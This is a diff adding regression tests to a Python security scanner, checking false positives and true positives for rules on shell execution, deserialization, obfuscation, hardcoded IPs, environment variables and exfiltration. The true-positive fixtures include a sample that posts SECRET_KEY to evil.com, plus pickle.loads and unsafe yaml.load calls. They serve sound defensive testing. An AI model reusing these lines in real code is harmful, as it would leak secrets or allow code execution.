@@ -701,6 +701,216 @@ def test_safe_skill(results: TestResults):
         cleanup(tmp)
 
 
+def test_s1_no_fp_uvicorn_asyncio(results: TestResults):
+    """Test S1: uvicorn.run() and asyncio.run() should NOT trigger shell execution."""
+    tmp = create_temp_project({
+        "server.py": (
+            'import uvicorn\n'
+            'uvicorn.run("app:app", host="0.0.0.0", port=8000)\n'
+        ),
+        "async_app.py": (
+            'import asyncio\n'
+            'async def main():\n'
+            '    pass\n'
+            'asyncio.run(main())\n'
+        ),
+        "flask_app.py": (
+            'from flask import Flask\n'
+            'app = Flask(__name__)\n'
+            'app.run(debug=True)\n'
+        ),
+    })
+    try:
+        engine = ASTEngine()
+        for fname in ["server.py", "async_app.py", "flask_app.py"]:
+            findings = [f for f in engine.scan_file(f"{tmp}/{fname}", tmp) if f.rule_id == "S1"]
+            results.check(f"S1 FP: {fname} = no alert", len(findings) == 0,
+                           f"Got {len(findings)} false positives for {fname}")
+    finally:
+        cleanup(tmp)
+
+
+def test_s12_no_fp_path_open(results: TestResults):
+    """Test S12: path.open(), gzip.open(), csv writer should NOT trigger deserialization."""
+    tmp = create_temp_project({
+        "file_io.py": (
+            'from pathlib import Path\n'
+            'p = Path("data.bin")\n'
+            'with p.open("rb") as f:\n'
+            '    header = f.read(4)\n'
+        ),
+        "csv_write.py": (
+            'import csv\n'
+            'with open("out.csv", "w") as f:\n'
+            '    writer = csv.writer(f)\n'
+            '    writer.writerow(["a", "b"])\n'
+        ),
+    })
+    try:
+        engine = ASTEngine()
+        for fname in ["file_io.py", "csv_write.py"]:
+            findings = [f for f in engine.scan_file(f"{tmp}/{fname}", tmp) if f.rule_id == "S12"]
+            results.check(f"S12 FP: {fname} = no alert", len(findings) == 0,
+                           f"Got {len(findings)} false positives for {fname}")
+    finally:
+        cleanup(tmp)
+
+
+def test_s12_still_catches_pickle(results: TestResults):
+    """Test S12: pickle.loads should still be caught after the fix."""
+    tmp = create_temp_project({
+        "evil.py": 'import pickle\ndata = open("x.pkl","rb").read()\npickle.loads(data)\n',
+        "yaml_unsafe.py": 'import yaml\ndata = yaml.load(open("x.yaml"), Loader=yaml.FullLoader)\n',
+    })
+    try:
+        engine = ASTEngine()
+        pickle_findings = [f for f in engine.scan_file(f"{tmp}/evil.py", tmp) if f.rule_id == "S12"]
+        yaml_findings = [f for f in engine.scan_file(f"{tmp}/yaml_unsafe.py", tmp) if f.rule_id == "S12"]
+        results.check("S12 TP: pickle.loads still caught", len(pickle_findings) > 0,
+                       "Expected S12 finding for pickle.loads")
+        results.check("S12 TP: yaml.load(FullLoader) still caught", len(yaml_findings) > 0,
+                       "Expected S12 finding for yaml.load with FullLoader")
+    finally:
+        cleanup(tmp)
+
+
+def test_p3_no_fp_regex_and_magic_bytes(results: TestResults):
+    """Test P3: regex char classes and binary magic bytes should NOT trigger obfuscation."""
+    tmp = create_temp_project({
+        "regex_clean.py": (
+            'import re\n'
+            'pattern = re.compile(r"[\\x00-\\x1f\\x7f-\\x9f\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07]")\n'
+            'cleaned = re.sub(pattern, "", text)\n'
+        ),
+        "magic_bytes.py": (
+            'PNG_HEADER = b"\\x89PNG\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0d"\n'
+        ),
+    })
+    try:
+        engine = PatternEngine()
+        for fname in ["regex_clean.py", "magic_bytes.py"]:
+            findings = [f for f in engine.scan_file(f"{tmp}/{fname}", tmp) if f.rule_id == "P3"]
+            results.check(f"P3 FP: {fname} = no alert", len(findings) == 0,
+                           f"Got {len(findings)} false positives for {fname}")
+    finally:
+        cleanup(tmp)
+
+
+def test_p4_no_fp_version_and_doc_ip(results: TestResults):
+    """Test P4: version numbers and RFC 5737 doc IPs should NOT trigger."""
+    tmp = create_temp_project({
+        "versions.py": (
+            '# Library version 4.1.6.14\n'
+            'FFMPEG_VERSION = "4.1.6.14"\n'
+            'requires = "package==2.3.4.5"\n'
+        ),
+        "doc_ips.py": (
+            '# RFC 5737 documentation examples\n'
+            'TEST_IP = "192.0.2.1"\n'
+            'EXAMPLE_IP = "198.51.100.42"\n'
+            'DOC_IP = "203.0.113.255"\n'
+        ),
+    })
+    try:
+        engine = PatternEngine()
+        ver_findings = [f for f in engine.scan_file(f"{tmp}/versions.py", tmp) if f.rule_id == "P4"]
+        doc_findings = [f for f in engine.scan_file(f"{tmp}/doc_ips.py", tmp) if f.rule_id == "P4"]
+        results.check("P4 FP: version numbers = no alert", len(ver_findings) == 0,
+                       f"Got {len(ver_findings)} false positives")
+        results.check("P4 FP: RFC 5737 doc IPs = no alert", len(doc_findings) == 0,
+                       f"Got {len(doc_findings)} false positives")
+    finally:
+        cleanup(tmp)
+
+
+def test_p4_still_catches_real_ips(results: TestResults):
+    """Test P4: real hardcoded public IPs should still be caught."""
+    tmp = create_temp_project({
+        "real_ip.py": 'SERVER = "8.8.8.8"\nBACKUP = "1.1.1.1"\n',
+    })
+    try:
+        engine = PatternEngine()
+        findings = [f for f in engine.scan_file(f"{tmp}/real_ip.py", tmp) if f.rule_id == "P4"]
+        results.check("P4 TP: real public IPs still caught", len(findings) >= 2,
+                       f"Expected >=2, got {len(findings)}")
+    finally:
+        cleanup(tmp)
+
+
+def test_s5_noise_reduction(results: TestResults):
+    """Test S5: non-sensitive env vars should be INFO, not LOW/MEDIUM."""
+    tmp = create_temp_project({
+        "config.py": (
+            'import os\n'
+            'a = os.environ.get("WECHAT_TOOL_NAME")\n'
+            'b = os.environ.get("WECHAT_TOOL_VERSION")\n'
+            'c = os.environ.get("WECHAT_TOOL_AUTHOR")\n'
+            'd = os.environ.get("APP_MODE")\n'
+        ),
+        "sensitive.py": (
+            'import os\n'
+            's = os.environ.get("SECRET_KEY")\n'
+        ),
+    })
+    try:
+        engine = ASTEngine()
+        config_findings = [f for f in engine.scan_file(f"{tmp}/config.py", tmp) if f.rule_id == "S5"]
+        sensitive_findings = [f for f in engine.scan_file(f"{tmp}/sensitive.py", tmp) if f.rule_id == "S5"]
+
+        # Non-sensitive should all be INFO
+        non_info = [f for f in config_findings if f.severity != Severity.INFO]
+        results.check("S5: non-sensitive env = INFO level", len(non_info) == 0,
+                       f"Got {len(non_info)} non-INFO findings for config vars")
+
+        # Sensitive should still be MEDIUM
+        results.check("S5: SECRET_KEY = MEDIUM", len(sensitive_findings) > 0 and sensitive_findings[0].severity == Severity.MEDIUM,
+                       f"Expected MEDIUM, got {sensitive_findings[0].severity.value if sensitive_findings else 'none'}")
+    finally:
+        cleanup(tmp)
+
+
+def test_p5_mal010_no_fp_config_reads(results: TestResults):
+    """Test P5 MAL-010: file that reads env vars AND makes HTTP requests should NOT trigger."""
+    tmp = create_temp_project({
+        "api_client.py": (
+            'import os\n'
+            'import requests\n'
+            '\n'
+            'API_KEY = os.environ.get("MY_API_KEY")\n'
+            'BASE_URL = os.environ.get("BASE_URL")\n'
+            '\n'
+            'def get_data():\n'
+            '    return requests.get(f"{BASE_URL}/data", headers={"key": API_KEY})\n'
+        ),
+    })
+    try:
+        engine = PatternEngine()
+        findings = [f for f in engine.scan_file(f"{tmp}/api_client.py", tmp)
+                     if f.rule_id == "P5" and "exfiltration" in f.title.lower()]
+        results.check("P5 MAL-010 FP: normal API client = no alert", len(findings) == 0,
+                       f"Got {len(findings)} false positives")
+    finally:
+        cleanup(tmp)
+
+
+def test_p5_mal010_still_catches_exfil(results: TestResults):
+    """Test P5 MAL-010: actual same-line exfiltration should still be caught."""
+    tmp = create_temp_project({
+        "exfil.py": (
+            'import os, requests\n'
+            'requests.post("https://evil.com", data=os.environ["SECRET_KEY"])\n'
+        ),
+    })
+    try:
+        engine = PatternEngine()
+        findings = [f for f in engine.scan_file(f"{tmp}/exfil.py", tmp)
+                     if f.rule_id == "P5" and "exfiltration" in f.title.lower()]
+        results.check("P5 MAL-010 TP: same-line exfil caught", len(findings) > 0,
+                       "Expected P5 MAL-010 finding for same-line exfiltration")
+    finally:
+        cleanup(tmp)
+
+
 def test_multiple_findings_scoring(results: TestResults):
     """Test that scoring accumulates properly and respects caps."""
     # Multiple MEDIUM findings
@@ -790,6 +1000,15 @@ def main():
         ("Fetcher Local Path", test_fetcher_local_path),
         ("Empty Project", test_empty_project),
         ("Safe Skill", test_safe_skill),
+        ("S1 FP: uvicorn/asyncio/flask.run()", test_s1_no_fp_uvicorn_asyncio),
+        ("S12 FP: path.open()/csv writer", test_s12_no_fp_path_open),
+        ("S12 TP: pickle/yaml still caught", test_s12_still_catches_pickle),
+        ("P3 FP: regex context & magic bytes", test_p3_no_fp_regex_and_magic_bytes),
+        ("P4 FP: version nums & doc IPs", test_p4_no_fp_version_and_doc_ip),
+        ("P4 TP: real IPs still caught", test_p4_still_catches_real_ips),
+        ("S5: noise reduction", test_s5_noise_reduction),
+        ("P5 MAL-010 FP: config reads", test_p5_mal010_no_fp_config_reads),
+        ("P5 MAL-010 TP: same-line exfil", test_p5_mal010_still_catches_exfil),
         ("Multiple Findings Scoring", test_multiple_findings_scoring),
         ("Scoring Model", test_scoring),
         ("Suppression", test_suppression),
